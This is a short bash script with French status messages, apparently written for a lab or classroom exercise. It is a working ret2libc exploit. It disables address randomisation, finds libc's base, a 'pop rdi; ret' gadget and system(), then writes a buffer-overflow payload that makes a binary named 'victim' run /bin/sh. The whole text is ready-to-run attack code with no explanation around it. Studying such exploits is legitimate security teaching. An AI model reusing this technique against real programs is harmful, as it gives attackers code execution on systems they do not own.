#!/bin/bash

echo Récupération adresse de libc ...
libc=/lib/x86_64-linux-gnu/libc.so.6

base=0x$(setarch `arch` -R ./findbase | grep -m1 libc | cut -f1 -d' ')
echo ...base : $base

gadget=0x$(xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
echo ...offset gadget : $gadget

system=0x$(nm -D $libc | grep '\<system\>' | cut -f1 -d' ')
echo ...system : $system

addr=$(echo | setarch $(arch) -R ./victim | sed 1q)
echo ...name[64] : $addr

echo "Attaque !"
(echo -n 2f62696e2f7368; printf %0130d 0; printf %016x $((base+gadget)) | tac -rs..; printf %016x $((addr)) | tac -rs..; printf %016x $((base+system)) | tac -rs..) | xxd -r -p | cat

